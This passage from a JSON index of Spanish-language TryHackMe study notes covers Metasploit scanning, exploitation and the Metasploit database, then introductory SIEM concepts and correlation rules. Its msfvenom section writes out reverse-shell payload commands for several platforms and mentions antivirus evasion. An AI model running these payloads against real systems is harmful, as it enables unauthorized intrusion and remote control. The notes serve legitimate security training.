    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 1. Moniker Link (CVE-2024-21413)",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/1. Moniker Link (CVE-2024-21413)/1. Introduction]]\n[[2. Moniker Link (CVE-2024-21413)]]\n[[3. Exploitation]]\n[[4. Detection]]\n[[5. Remediation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. The Metasploit Database",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/3-the-metasploit-database/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/3. The Metasploit Database.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Aunque no es necesario en TryHackMe, un escenario realista de pentesting probablemente tendr√° varios objetivos.\n\nMetasploit tiene una funci√≥n de base de datos para simplificar el manejo de proyectos y evitar posibles confusiones al configurar par√°metros.\n\n>[!NOTE] Los siguientes pasos han sido seguidos en la AttackBox de TryHackMe as√≠ que s√≥lo deber√°s hacer esto si has instalado Metasploit t√∫ mismo o est√°s usando tu propia m√°quina.\n\nPrimero debes lanzar PostgreSQL con el comando `systemctl startpostgresql`. Despu√©s tendremos que iniciar la base de datos de Metasploit usando el comando `msfdb init`. Intentar usar ese comando como root puede devolver un error, por lo que podemos ejecutarlo con el usuario postgres: `sudo -u postgres msfdb init`. Para borrar una base de datos: `sudo -u postgres msfdb delete`.\n\nUna vez hecho esto puedes lanzar `msfcosole` y comprobar el estado de la base de datos usando el comando `db_status`. \n\nLa funci√≥n de base de datos nos permitir√° crear espacios de trabajo para aislar los diferentes proyectos. Puedes listar estos espacios usando el comando `workspace`. \n\nPuedes a√±adir o eliminar estos a√±adiendo `-a` o `-d`, respectivamente. Para cambiar de uno a otro simplemente usa `workspace` seguido del nombre deseado. Puedes usar el comando `workspace -h` para listar las opciones de argumentos disponibles para `workspace`. \n\nSi quieres hacer un escaneo de nmap, usa `db_nmap` para que los resultados queden guardados. Ahora puedes acceder a la informaci√≥n relevante sobre los hosts y los servicios con los comandos `hosts` y `services`. A√±adiendo `-h` a estos comandos puedes ver las opciones que tienen.\n\nPuedes usar el comando `hosts -R` para a√±adir el valor al par√°metro RHOSTS.\n\n-------------\n<h2>Ejemplo de Flujo de Trabajo</h2>\n1. Usaremos el m√≥dulo de escaneo de vulnerabilidades que puede encontrar las vulnerabilidades MS17-010: `use auxiliary/scanner/smb/smb_ms17_010`.\n2. Configuramos el par√°metro RHOSTS usando `hosts -R`.\n3. Escribimos `show options` para ver si los valores se asignaron correctamente.\n4. Una vez que todo est√° en su sitio, lanzamos el exploit usando `run` o `exploit`.\n\nSi hay m√°s de una direcci√≥n IP guardada en la base, todas ser√°n usadas con el comando `hosts -R`.\n\nEn un caso t√≠pico de pentesting podr√≠amos tener el siguiente escenario:\n\n- Encontramos hosts disponibles con el comando `db_nmap`.\n- Escaneamos estos para encontrar vulnerabilidades o puertos abiertos usando m√≥dulos.\n\nEl comando `service` usado con el par√°metro `-S` (`services -S netbios`) te permite buscar servicios espec√≠ficos en el entorno.\n\nTe interesa buscar en puertos que tengan alguno de los siguientes servicios:\n\n- HTTP\n- SQL\n- FTP\n- SMB\n- SSH\n- RDP",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Metasploit - Exploitation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/0-metasploit-exploitation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/0. Metasploit - Exploitation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/1. Introduction]]\n[[2. Scanning]]\n[[3. The Metasploit Database]]\n[[4. Vulnerability Scanning]]\n[[5. Exploitation]]\n[[6. Msfvenom]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "En esta unidad aprenderemos a c√≥mo usar Metasploit para el escaneo de vulnerabilidades y explotaci√≥n. Tambi√©n veremos c√≥mo la funci√≥n de base de datos hace m√°s f√°cil manejar el pentesting con un enfoque m√°s amplio. Finalmente veremos la generaci√≥n de payloads con `msfvenom` y c√≥mo empezar una sesi√≥n de Meterpreter en la mayor√≠a de plataformas.\n\n------------------\n<h2>Objetivos de Aprendizaje</h2>\n- C√≥mo escanear objetivos usando Metasploit.\n- C√≥mo usar la funci√≥n de base de datos de Metasploit.\n- C√≥mo usar Metasploit para realizar un escaneo de vulnerabilidades.\n- C√≥mo usar Metasploit para explotar servicios vulnerables en objetivos.\n- C√≥mo puede ser usado `msfvenom` para crear payloads y obtener una sesi√≥n de meterpreter en el objetivo.\n\n>[!NOTE] Todas las preguntas relacionadas con el uso de diccionarios o de ataques de fuerza bruta ser√°n usando el diccionario: `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`.\n\nSi optas por usar tu propia m√°quina descarga el diccionario. Para continuar con esta unidad utiliza el comando `msfconsole`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Exploitation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/5-exploitation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/5. Exploitation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Como el propio nombre sugiere, metasploit es una herramienta de explotaci√≥n. Los m√≥dulos de explotaci√≥n son los m√°s abundantes.  Puedes buscar estos usando el comando `search`, obtener informaci√≥n sobre ellos usando el comando `info` y ejecutar los exploits usando el comando `run` o `exploit`.\n\nLa mayor√≠a de exploits, tendr√°n un payload predefinido. Puedes usar `show payloads` para listar otros comandos que poder utilizar con ese exploit.\n\n```sbash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads \n\nCompatible Payloads\n===================\n\n   #   Name                                        Rank    Check  Description\n   -   ----                                        ----    -----  -----------\n   0   generic/custom                              manual  No     Custom Payload\n   1   generic/shell_bind_tcp                      manual  No     Generic Command Shell, Bind TCP Inline\n   2   generic/shell_reverse_tcp                   manual  No     Generic Command Shell, Reverse TCP Inline\n   3   windows/x64/exec                            manual  No     Windows x64 Execute Command\n   4   windows/x64/loadlibrary                     manual  No     Windows x64 LoadLibrary Path\n   5   windows/x64/messagebox                      manual  No     Windows MessageBox x64\n   6   windows/x64/meterpreter/bind_ipv6_tcp       manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager\n   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support\n   8   windows/x64/meterpreter/bind_named_pipe     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager\n   9   windows/x64/meterpreter/bind_tcp            manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager\n   10  windows/x64/meterpreter/bind_tcp_rc4 \n```\n\nUna vez hayas decidido el payload puedes usar el comando `set payload` para hacer tu elecci√≥n.\n\n>[!NOTE] Elegir un payload que funcione puede suponer un proceso de prueba y error debido a restricciones de sistema operativo, entorno o firewalls, anti-virus, anti escritura, etc.\n\nUna vez que una sesi√≥n ha comenzado la puedes poner en segundo plano usando `Ctrl + Z` o pararla usando `Ctrl + C`.\n\n------------------\n<h2>Trabajar con sesiones</h2>\nEl comando `sessions` listar√° todas las sesiones activas. Soporta un n√∫mero de opciones que nos ayudar√°n a manejarlas. Podemos interactuar con una sesi√≥n existente usando el comando `sessions -i` seguido del ID de la sesi√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Msfvenom",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/6-msfvenom/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/6. Msfvenom.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Msfvenom reemplaz√≥ a Msfpayload y Msfencode y te permite generar payloads. Msfvenom te permite acceder a todos los payloads disponibles en el framework de Metasploit. Te permite crear payloads en diferentes formatos (PHP, exe, dll, elf, etc.) y para varios diferentes sistemas (Apple, Windows, Android, Linux, etc.).\n\n------------------------\n<h2>Formatos de salida</h2>\nPuedes generar un ejecutable para meterpreter o un archivo crudo, como python. El comando `msfvenom --list formats` puede ser usado para listar formatos de salida soportados.\n\n---------------------\n<h2>Encoders</h2>\nContrario a lo que algunos piensan, los encoders no tratan de sobrepasar antivirus instalados. Efectivamente codifican el payload, pero m√°s al ojo humano que a una m√°quina. Una pr√°ctica m√°s robusta para evitar antivirus ser√≠a usar t√©cnicas modernas de ofuscaci√≥n o inyectar c√≥digo shell. Para encodear debemos usar el par√°metro `-e`, por ejemplo:\n\n`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`\n\n- `-p`: Especifica el tipo de payload.\n- `-f`: Especifica el formato, en este caso `raw`, lo que significa que no contendr√° headers ni formateo.\n- `-e`: Especifica que el payload deber√° ser encodeado.\n\n------------------------\n<h2>Handlers</h2>\nSimilar a los exploits generando una reverse shell, necesitar√°s ser capaz de aceptar conexiones entrantes generadas por el payload de Msfvenom. Al usar un m√≥dulo de explotaci√≥n todo esto es manejado autom√°ticamente. El t√©rmino usado para recibir una conexi√≥n es \"catching shell\".\n\nExplotaremos una vulnerabilidad presente en DVWA (Damn Vulnerable Web Application), los pasos son:\n\n1. Generar una shell PHP usando MSFvenom.\n2. Lanzar el handler de Metasploit.\n3. Ejecutar la shell PHP.\n\n>[!NOTE] El PHP de salida no tendr√° el tag de php inicial ni final, hay que editarlo para que sea v√°lido.\n\nPara usar el multi handler, usaremos el m√≥dulo `use exploit/multi/handler`. El multi handler funciona para todos los payloads de Metasploit y puede ser usado para Meterpreter tambi√©n.\n\nPara usar el m√≥dulo, necesitaremos configurar el valor del payload (`php/reverse_php` en este caso), el LHOST y el LPORT.\n\n--------------------\n<h2>Otros payloads</h2>\nBas√°ndonos en la configuraci√≥n del sistema objetivo, msfvenom puede usarse para crear payloads en casi todos los formatos:\n\n<h5>Linux Executable and Linkable Format (elf)</h5>\n`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`\n\nEs como el formato `.exe` en Windows.\n\n<h5>Windows</h5>\n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`\n<h5>PHP</h5>\n`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`\n<h5>ASP</h5>\n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`\n<h5>Python</h5>\n`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`\n\n\nTodos estos ejemplos son payloads reverse.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/2-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/2. Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "<h2>Escaneo de Puertos</h2>\nMetasploit tiene un n√∫mero de m√≥dulos para escanear puertos abiertos en el sistema objetivo y su red. Puedes listarlos usando el comando `search portscan`. Requerir√° que configures unas cuantas opciones:\n\n- **CONCURRENCY:** N√∫mero de objetivos escaneados a la vez.\n- **PORTS:** Rango de puertos a escanear. No es lo mismo que Nmap, pues este escanea los 1000 puertos mas usados y este del 1 al 1000.\n- **RHOSTS:** Objetivo o red objetivo a escanear.\n- **THREADS:** N√∫mero de hilos que ser√°n usados a la vez.\n\nPuedes ejecutar nmap directamente desde la consola de `msfconsole`.  En cuanto a la recopilaci√≥n de informaci√≥n, si requieres de un escaneo r√°pido, quiz√°s Metasploit no sea la opci√≥n m√°s indicada (s√≠ por alg√∫n m√≥dulo). \n\n---------------\n<h2>Identificaci√≥n de servicios UDP</h2>\nEl m√≥dulo `scanner/discovery/udp_sweep` nos permite identificar r√°pidamente servicios corriendo sobre UDP. Este m√≥dulo no escanear√° todos los posibles servicios UDP pero nos ofrece una alternativa r√°pida para identificar servicios como DNS o NetBIOS.\n\n-----------------\n<h2>Escaneos SMB</h2>\nMetasploit ofrece varios m√≥dulos auxiliares que nos permiten escanear servicios espec√≠ficos. Especialmente √∫tiles en un entorno empresarial ser√≠an `smb_enumshares` y `smb_version`. No obstante, debes dedicar un tiempo a investigar sobre los esc√°neres instalados en tu versi√≥n de Metasploit.\n\nAl realizar escaneo de servicios es importante no omitir servicios m√°s ex√≥ticos",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Vulnerability Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/3-metasploit-exploitation/4-vulnerability-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/4. Vulnerability Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 3. Metasploit - Exploitation",
    "content": "Metasploit te permite identificar r√°pidamente vulnerabilidades cr√≠ticas. El t√©rmino \"low hanging fruit\" (fruta que cuelga bajo) se refiere al tipo de vulnerabilidades que on f√°cilmente identificables y explotables.\n\nPuedes usar el comando `search` para listar m√≥dulos √∫tiles. Puedes usar el comando `info` para obtener m√°s informaci√≥n acerca de como se usa y su prop√≥sito.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "SIEM quiere decir **Security Information and Event Management**. Es una herramienta que recolecta informaci√≥n de varios endpoints/dispositivos de red, los guarda en un lugar centralizado y realiza correlaci√≥n entre ellos. Esta unidad cubrir√° conceptos b√°sicos requeridos para entender los SIEMs y c√≥mo funcionan.\n\n----------------------\n<h2>Objetivos de Aprendizaje</h2>\nAlgunos son:\n\n- ¬øQu√© es un SIEM y c√≥mo funciona?\n- ¬øPor qu√© necesitamos SIEMs?\n- ¬øQu√© es la visibilidad de red?\n- ¬øQue son las fuentes de logs y c√≥mo se hace la ingesti√≥n de logs?\n- ¬øCu√°les son las capabilities que ofrece un SIEM?",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Introduction to SIEM",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/0-introduction-to-siem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/0. Introduction to SIEM.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/1. Introduction]]\n[[2. Network Visibility through SIEM]]\n[[3. Log Sources and Log Ingestion]]\n[[4. Why SIEM]]\n[[5. Analysing Logs and Alerts]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Log Sources and Log Ingestion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/3-log-sources-and-log-ingestion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/3. Log Sources and Log Ingestion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "Cada dispositivo en la red genera alg√∫n tipo de log cuando una actividad se realiza en √©l. Algunos dispositivos comunes que se suelen encontrar en un entorno de red son:\n\n---------------------------\n<h2>M√°quinas Windows</h2>\nWindows registra cada evento que puede ser visto mediante la utilidad Event Viewer. Asigna un ID √∫nico a cada tipo de actividad de log, haciendo f√°cil para el analista examinar y llevar cuenta de ellos. Para ver eventos en un entorno Windows vale con escribir `Event Viewer` en la barra de b√∫squeda. Estos logs de los endpoints Windows se redirigen al SIEM.\n\n![[Pasted image 20251022224503.png]]\n\n-----------------------\n<h2>Estaciones de Trabajo Linux</h2>\nLinux guarda todos los logs como eventos, errores, avisos, etc. Estos son ingeridos por el SIEM a posteriori para monitorizaci√≥n constante. Algunas de las rutas comunes para logs de Linux son:\n\n- **/var/log/httpd:** Contiene peticiones HTTP con respuesta y errores.\n- **/var/log/cron:** Aquellos eventos relacionados con cron se guardan aqu√≠.\n- **/var/log/auth.log y /var/log/secure:** Guarda todos los logs referentes a la autentificaci√≥n.\n- **/var/log/kern:** Este archivo guarda logs relacionados con el kernel.\n\nAqu√≠ un log de ejemplo de cron:\n```log\nMay 28 13:04:20 ebr crond[2843]: /usr/sbin/crond 4.4 dillon's cron daemon, started with loglevel notice  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-hourly)  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-daily)  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-weekly)  \nMay 28 13:04:20 ebr crond[2843]: no timestamp found (user root job sys-monthly)  \nJun 13 07:46:22 ebr crond[3592]: unable to exec /usr/sbin/sendmail: cron output f\n```\n\n-----------------------------\n<h2>Servidor Web</h2>\nEs importante mantener un ojo en todas las peticiones/respuestas entrando y saliendo de un servidor web, por cualquier ataque web potencial. En Linux, rutas comunes para los logs relacionados con Apache son **/var/log/apache** o **/var/log/httpd**.\n\nAqu√≠ un log de ejemplo de apache:\n\n```log\n192.168.21.200 - - [21/March/2022:10:17:10 -0300] \"GET /cgi-bin/try/ HTTP/1.0\" 200 3395\n127.0.0.1 - - [21/March/2022:10:22:04 -0300] \"GET / HTTP/1.0\" 200 2216\n```\n\n--------------------------\n<h2>Ingesti√≥n de Red</h2>\nTodos estos logs ofrecen una riqueza de informaci√≥n que puede ayudar a identificar problemas de seguridad. Cada SIEM tiene su propia manera de ingerir logs. Algunos m√©todos comunes son:\n\n1. **Agent / Forwarder:** Estas soluciones ofrecen una herramienta ligera llamada agente que se instala en cada endpoint. Est√° configurado para capturar todos los logs importantes y mandarlos al servidor del SIEM.\n2. **Syslog:** Es un protocolo ampliamente usado para recolectar informaci√≥n de varios sistemas como servidores web, bases de datos, etc, que se manda en tiempo real al destino centralizado.\n3. **Manual Upload:** Algunas soluciones SIEM, como Splunk, ELK, etc, permiten a los usuarios ingerir data offline para an√°lisis r√°pido. Una vez ingerida, se normaliza y se hace disponible para el an√°lisis.\n4. **Port-Forwarding:** Algunas soluciones SIEM pueden ser configuradas para escuchar un cierto puerto y luego los endpoints redireccionan informaci√≥n al SIEM en el puerto en escucha.\n\nUn ejemplo de c√≥mo Splunk ofrece varias formas de ingesti√≥n de logs.\n\n![[Pasted image 20251022230936.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Why SIEM",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/4-why-siem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/4. Why SIEM.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "El SIEM se usa para ofrecer correlaci√≥n entre informaci√≥n y amenazas detectadas. Una vez detectada la amenaza, se eleva una alerta. Esta permite a los analistas tomar acciones acordes a la investigaci√≥n. El SIEM juega un rol importante en el dominio de la ciberseguridad, ayudando a protegerse contra las √∫ltimas amenazas en cuesti√≥n de poco tiempo. Proporciona buena visibilidad de lo que pasa en la infraestructura de red.\n\n------------------------\n<h2>Capabilidades SIEM</h2>\nEl SIEM es uno de los mayores componentes de los entornos SOC. El SIEM empieza recolectando logs y examin√°ndolos si alg√∫n evento o flujo tiene una condici√≥n coincidente configurada en las reglas.\n\nAlgunas capabilidades del SIEM son:\n\n- Correlaci√≥n entre eventos de diferentes fuentes.\n- Ofrecer visibilidad en las actividades host-centric y network-centric.\n- Permite a los analistas investigar las √∫ltimas amenazas.\n- Cazar amenazas que no hayan sido detectadas por las reglas.\n\n---------------------------------\n<h2>Responsabilidades de un Analista SOC</h2>\nLos analistas SOC utilizan SIEMs para tener mejor visibilidad de lo que est√° pasando en la red. Algunas de sus responsabilidades incluyen:\n\n- Monitorizar e investigar.\n- Identificar los falsos positivos.\n- Modificar reglas que est√°n causando falsos positivos.\n- Reportes y legalidad vigente.\n- Identificar puntos ciegos en la red y cubrirlos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Network Visibility through SIEM",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/2-network-visibility-through-siem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/2. Network Visibility through SIEM.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "Antes de explicar la importancia del SIEM, tratemos de entender por qu√© es cr√≠tico tener mejor visibilidad de todas las actividades en una red. La imagen debajo muestra un ejemplo de una red simple que compete varios endpoints basados en Windows/Linux, un servidor de datos y un sitio web. Cada componente se comunica con otro o accede a internet a trav√©s del router.\n\n![[Pasted image 20251022221746.png]]\n\nComo ya sabemos, cada componente de red puede tener uno o m√°s fuentes de logs generando diferentes logs. Podemos dividir las fuentes de logs de red en dos partes l√≥gicas:\n\n1. **Fuentes de Logs Host-Centric:**\n   Estas son fuentes de red que capturan eventos que ocurrieron en o de forma relacionada con el host. Algunas fuentes de logs de este tipo son Windows Event logs, Sysmon, Osquery, etc. Algunos ejemplos incluyen:\n\t1. Un usuario accede a un archivo.\n\t2. Un usuario intenta autenticarse.\n\t3. La actividad de ejecuci√≥n de un proceso.\n\t4. Un proceso a√±ade, edita o elimina una clave de registro o valor.\n\t5. Ejecuci√≥n de Powershell.\n2. **Fuentes de Logs Network-Centric:**\n   Son logs generados cuando los hosts se comunican entre ellos o acceden a internet para visitar el sitio web. Algunos protocolos basados en red son SSH, VPN, HTTP/S, FTP, etc. Algunos ejemplos incluyen:\n\t1. Conexi√≥n SSH.\n\t2. Un archivo es accedido v√≠a FTP.\n\t3. Tr√°fico Web.\n\t4. Un usuario accede a un recurso de la compa√±√≠a mediante VPN.\n\t5. Compartici√≥n de archivos mediante red.\n\n---------------------------------------\n<h2>Importancia de un SIEM</h2>\nAhora que hemos cubierto varios tipos de logs es hora de entender la importancia del SIEM. Como todos estos dispositivos generan cientos de eventos por segundo, examinarlos todos en cada dispositivo puede ser una tarea casi imposible. Esa es una de las ventajas de tener un SIEM incorporado. No s√≥lo toma los logs de varias fuentes en tiempo real sino que tambi√©n ofrece la capacidad de correlacionar eventos, buscar logs, investigar incidentes y responder a ellos. Algunas funcionalidades clave que ofrece un SIEM son:\n\n- Ingesti√≥n de los en tiempo real.\n- Alertar ante actividades inusuales.\n- Monitorizaci√≥n y visibilidad 24/7.\n- Protecci√≥n contra las √∫ltimas amenazas mediante detecci√≥n temprana.\n- Estad√≠sticas de la informaci√≥n y visualizaci√≥n.\n- Habilidad para investigar incidentes pasados.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Analysing Logs and Alerts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/1-introduction-to-siem/5-analysing-logs-and-alerts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/1. Introduction to SIEM/5. Analysing Logs and Alerts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 1. Introduction to SIEM",
    "content": "Los SIEMs recogen todos los logs relacionados con la seguridad ingeridos por los agentes, port forwarding, etc. Una vez que los logs ses han ingerido, el SIEM busca todos los comportamientos no deseados o patrones sospechosos dentro de los logs con la ayuda de condiciones configuradas por reglas. Si la condici√≥n coincide, se dispara una alerta.\n\n-------------------------\n<h2>Dashboard</h2>\nLos dashboards son el componente m√°s importante de los SIEMs. El SIEM presenta la informaci√≥n despu√©s de ser normalizada e ingerida. El resumen de estos an√°lisis se presenta en forma de vista accionable, con la ayuda de m√∫ltiples dashboards. Cada soluci√≥n SIEM viene con algunos dashboards por defecto y ofrece una opci√≥n de personalizar dashboards. Alguna de la informaci√≥n que podemos encontrar en un dashboard es:\n\n- Alertas importantes\n- Notificaciones del sistema\n- Alerta de salud\n- Lista de los intentos fallidos de inicio de sesi√≥n\n- Contador de los eventos ingeridos\n- Reglas disparadas\n- Dominios m√°s visitados\n\n![[Pasted image 20251024095310.png]]\n\n----------------------------\n<h2>Reglas de Correlaci√≥n</h2>\nLa reglas de correlaci√≥n juegan un papel importante en la detecci√≥n temprana de amenazas, permitiendo a los analistas tomar medidas a tiempo. Son expresiones l√≥gicas que pueden ser comprobadas, algunos ejemplos son:\n\n- Si un usuario obtiene 5 intentos de autentificaci√≥n fallidos en 10 segundos - Eleva una alerta por `Multiple Failed Login Attempts`.\n- Si un login es exitoso despu√©s de m√°s de 15 login attempts - Eleva una alerta por `Login After Multiple Attempts`.\n- Una regla que avise cuando se conecta un pincho, √∫til si est√° prohibido por pol√≠tica de compa√±√≠a.\n- Si el tr√°fico saliente es > 25MB- Eleva una alerta por `Potential Data Exfiltration`.\n\n---------------------------\n<h2>C√≥mo se Crea una Regla de Correlaci√≥n</h2>\nPara explicar c√≥mo funciona la regla, consideraremos los siguientes dos escenarios:\n\n<h4>Caso de Uso 1:</h4>\nLos atacantes tienden a borrar logs despu√©s de su intrusi√≥n para eliminar el rastro. Un evento con ID √∫nico (**104**) se registra cada vez que un usuario intente borrar un log. Para crear una regla basada en esta condici√≥n podemos hacerlo como:\n\n**Rule:** Si la fuente de log es WinEventLog **AND** ID de Evento es 104 - Dispara alerta para `Event Log Cleared`\n\n<h4>Caso de Uso 2:</h4>\nLos atacantes usan comandos como whoami despu√©s de una explotaci√≥n o escalada de privilegios. Los siguientes campos ser√≠an √∫tiles de incluir en la regla.\n\n- Fuente de log\n- ID de evento\n- Nombre del nuevo proceso\n\n**Rule:** Si la fuente de log es WinEventLog **AND** EventCode es **4688** **AND** NewProcessName contiene **whoami** - Dispara una alerta para `WHOAMI command Execution DETECTED`\n\n------------------------------\n<h2>Despu√©s de la Investigaci√≥n</h2>\nAl monitorizar SIEM, los analistas pasan la mayor parte de su tiempo en las dashboards. Una vez se dispara una alerta, los flujos asociados a estas se examinan. Basado en la investigaci√≥n, el analista determina si es un verdadero o falso positivo. Algunas de las acciones realizadas son:\n\n- La alerta es una falsa alarma. Requiere ajustar la regla para evitar falsos positivos m√°s adelante.\n- La alerta es un positivo real. Realiza investigaci√≥n m√°s avanzada.\n- Contactar al due√±o del media para preguntar por la actividad.\n- Se confirma actividad sospechosa. Aislar al host infectado.\n- Bloquear la IP sospechosa.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Tools for Vulnerability Scanning",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/4-vulnerability-scanner-overview/3-tools-for-vulnerability-scanning/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/4. Vulnerability Scanner Overview/3. Tools for Vulnerability Scanning.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 4. Vulnerability Scanner Overview",
